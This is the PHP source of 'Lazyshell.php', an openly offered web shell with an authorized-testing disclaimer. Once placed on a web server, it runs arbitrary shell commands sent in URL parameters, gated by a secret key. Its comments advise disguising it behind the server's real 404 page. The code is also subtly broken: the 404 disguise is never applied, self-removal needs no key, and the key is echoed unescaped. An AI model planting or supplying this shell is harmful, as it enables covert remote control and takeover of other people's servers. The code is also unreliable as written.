<?php
// Lazyshell.php
// Author: Joey Lane
// Github: https://github.com/joeylane/Lazyshell.php

// THIS TOOL IS INTENDED TO BE USED FOR LEGAL AND AUTHORIZED TESTING ONLY!
// Users take full responsibility for any actions performed using this tool.
// The author accepts no liability for damage caused by this tool.
// If these terms are not acceptable to you, then do not use this tool.

// MIT License

// Copyright (c) 2020 Joey Lane

// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:

// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.

// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

// Usage: http://HOSTNAME/lazyshell.php?key=YOUR-SUPER-SECRET-KEY

// The secret key you will use to access the shell via the "?key=" URL parameter.
$secretkey = 'YOUR-SUPER-SECRET-KEY';

// The HTTP status code of the error page which will be returned if an invalid secret key, or no secret key is specified.
$statuscode = 404;

// The error page HTML code which will be displayed if an invalid secret key, or no secret key is specified.
// To blend in with the rest of the application/server, copy the HTML from the 404 page and paste it here.
$errorpagehtml = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at ' . $_SERVER['HTTP_HOST'] . ' Port ' . $_SERVER['SERVER_PORT'] . '</address>
</body></html>
';

// Ensure that all GET and GET parameter requirements have been satisfied before displaying the page or executing any shell commands.
if (isset($_GET['execute']) && !empty($_GET['command']) && $_GET['key'] == $secretkey) {
    $command = shell_exec($_GET['command']);
} elseif (isset($_GET['remove'])) {
    unlink(__FILE__);
    exit('Shell removed!');
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Lazyshell-PHP</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/darkly/bootstrap.min.css">
</head>
<body>
    <div class="container">
        <div class="mt-5 mb-4 row">
            <div class="col-sm-auto my-auto">
                <h1>Lazyshell-PHP</h1>
            </div>
            <div class="col-sm-auto my-auto">
                <form method="GET">
                    <button type="submit" class="btn btn-danger" name="remove" value="Remove">Remove Shell</button>
                </form>
            </div>
        </div>
        <form class="mb-3" method="GET">
            <div class="form-group">
                <label for="command">Command:</label>
                <input type="text" class="form-control mb-3" name="command" id="command" value="" required autofocus>
                <input type="hidden" name="key" id="key" value="<?= $_GET['key'] ?>" required>
            </div>
            <button type="submit" class="btn btn-primary" name="execute" value="Execute">Execute</button>
        </form>
        <div class="pb-2 mt-5">
            <?php if ($command): ?>
                <pre class="pl-2 pr-2 small"><?= htmlspecialchars($command, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php elseif (!$command && $_SERVER['REQUEST_METHOD'] == 'GET'): ?>
                <pre class="pl-2 pr-2 small">No results returned.</pre>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>